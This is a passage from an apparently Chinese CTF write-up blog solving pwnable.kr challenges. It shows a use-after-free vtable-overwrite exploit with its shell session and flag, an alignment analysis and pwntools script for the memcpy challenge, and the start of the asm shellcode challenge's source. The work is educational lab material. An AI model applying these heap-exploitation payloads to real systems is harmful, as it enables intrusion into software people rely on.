punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                w<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                data <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"your data is allocated"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                delete m<span class="token punctuation">;</span>                delete w<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>终于到 use-after-free 的题了</p><p>学习可以看下这个视频：<a href="https://www.youtube.com/watch?v=ZHghwsTRyzQ" target="_blank" rel="noopener">The Heap: How do use-after-free exploits work? - bin 0x16</a></p><p>题目提供了三种操作，分别对用 释放-分配-调用</p><ol><li>我们先来看下在堆中的结构，首先要确定大小为 24 字节</li></ol><pre class=" language-armasm"><code class="language-armasm">0x0000000000400efb <+55>:   mov    edi,0x180x0000000000400f00 <+60>:   call   0x400d90 <operator new(unsigned long)@plt></code></pre><p>在 heap 中我们也能看到分配了长度为0x20的空间，为什么不是0x18呢，是源自 malloc_chunk 时会进行对齐，具体可见这篇文章<a href="https://wiki.x10sec.org/pwn/heap/heap_structure/" target="_blank" rel="noopener">堆相关数据结构</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15916053178506.jpg" alt></p><p>通过 chunk 复用存入的结构体如下，可以看到数据分别对应</p><ul><li>8 (vptr)</li><li>8 (int_age)</li><li>8 (prt_name)</li></ul><p><strong>这里有个奇怪的点，可以看到 ptr_name 均是指向上一个chunk被复用部分中的除 priv_size 和 size 的剩余部分，可能是编译优化导致的？</strong></p><p>注意到是先通过 Man 的虚表去调用 introduce 方法</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> x/4 0x4015700x401570 <vtable for Man+16>:    0x000000000040117a    0x00000000004012d20x401580 <vtable for Human>:    0x0000000000000000    0x00000000004015f0pwndbg> x 0x40117a0x40117a <Human::give_shell()>:    0x10ec8348e5894855pwndbg> x 0x4012d20x4012d2 <Man::introduce()>:    0x10ec8348e5894855</code></pre><p>所以我们只要能覆盖 vptr 使其指向 原地址-8，即0x401570 - 0x8 = 0x00401568，这样经过执行时的+0x8就会调用 give_shell 函数</p><p>这里还要注意，free 时先释放的 m 后释放的 w，所以填充时是先填充的 w 后填充 m，所以需要步骤 2 执行两次</p><p>另外，由于我们只需要填充 vptr 部分，所需 8 字节是小于释放的 chunk 的，所以会直接填充两次消耗释放的空间即可</p><h3 id="解题-15"><a href="#解题-15" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">uaf@pwnable:~$ python -c  'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > /tmp/uafpassuaf@pwnable:~$ ./uaf 8 /tmp/uafpass1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ cat flagyay_f1ag_aft3r_pwning</code></pre><p>参考：</p><ol><li><a href="https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/" target="_blank" rel="noopener">https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/</a></li><li><a href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/" target="_blank" rel="noopener">http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</a></li></ol><h2 id="17-memcpy"><a href="#17-memcpy" class="headerlink" title="17. memcpy"></a>17. memcpy</h2><h3 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rdtsc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">fast_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t i<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 64-byte block fast copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">>=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">64</span><span class="token punctuation">;</span>        len <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            __asm__ <span class="token function">__volatile__</span> <span class="token punctuation">(</span>            <span class="token string">"movdqa (%0), %%xmm0\n"</span>            <span class="token string">"movdqa 16(%0), %%xmm1\n"</span>            <span class="token string">"movdqa 32(%0), %%xmm2\n"</span>            <span class="token string">"movdqa 48(%0), %%xmm3\n"</span>            <span class="token string">"movntps %%xmm0, (%1)\n"</span>            <span class="token string">"movntps %%xmm1, 16(%1)\n"</span>            <span class="token string">"movntps %%xmm2, 32(%1)\n"</span>            <span class="token string">"movntps %%xmm3, 48(%1)\n"</span>            <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dest <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>            src <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// byte-to-byte slow copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, I have a boring assignment for CS class.. :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The assignment is simple.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- What is the best implementation of memcpy?        -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 1. implement your own slow/fast version of memcpy -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 2. compare them with various size of data         -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 3. conclude your experiment and submit report     -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, just help me out with my experiment and get flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No fancy hacking, I promise :D\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">;</span>    <span class="token keyword">int</span> e<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> high<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// allocate memory</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache2 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    src <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t sizes<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// setup experiment parameters</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span> e<span class="token operator">&lt;</span><span class="token number">14</span><span class="token punctuation">;</span> e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 2^13 = 8K</span>        low <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        high <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"specify the memcpy amount between %d ~ %d : "</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> size <span class="token operator">&lt;</span> low <span class="token operator">||</span> size <span class="token operator">></span> high <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"don't mess with the experiment.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        sizes<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ok, lets run the experiment with your configuration\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// run experiment</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        size <span class="token operator">=</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"experiment %d : memcpy with buffer size %d\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> size <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// byte-to-byte memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fast_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// block-to-block memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"thanks for helping my experiment!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag : ----- erased in this source code -----\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><blockquote><p>把源存储器内容值送入目的寄存器,当有m128时,必须对齐内存16字节,也就是内存地址低4位为0.</p><p>movntps m128,XMM<br>m128 &lt;== XMM 直接把XMM中的值送入m128，不经过cache,必须对齐16字节.</p></blockquote><p>注意到当 input &gt; 64 时，会调用 fast_memcpy 下的 movntps 指令，此时必须保证地址对齐</p><p>另外 malloc 通过 edx 值返回地址值</p><p>考虑到分配 chunk 时有固定 header，32 位下长度为 0x8 (priv_size + size)，所以每次input时，我们通过控制 padding 保证满足下列条件之一：</p><ul><li>(input + padding + len(header)) % 0x10 &gt; 0x8 这种情况会自动对齐至 0x10</li><li>(input + padding + len(header)) % 0x10 = 0x0</li></ul><p>推荐：<a href="https://www.cnblogs.com/wangaohui/p/5190889.html" target="_blank" rel="noopener">Malloc碎碎念</a></p><p><strong>这里添加一下对齐前后的堆内容的对比图片</strong></p><h3 id="解题-16"><a href="#解题-16" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>chunk_header <span class="token operator">=</span> <span class="token number">0x8</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9022</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">8</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> chunk_header    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] %d"</span> <span class="token operator">%</span> n<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"experiment!\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="18-asm"><a href="#18-asm" class="headerlink" title="18. asm"></a>18. asm</h2><h3 id="题目-17"><a href="#题目-17" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 128</span><span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    scmp_filter_ctx ctx <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_KILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>open<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit_group<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> stub<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> filter<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_FIXED <span class="token operator">|</span> MAP_PRIVATE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span 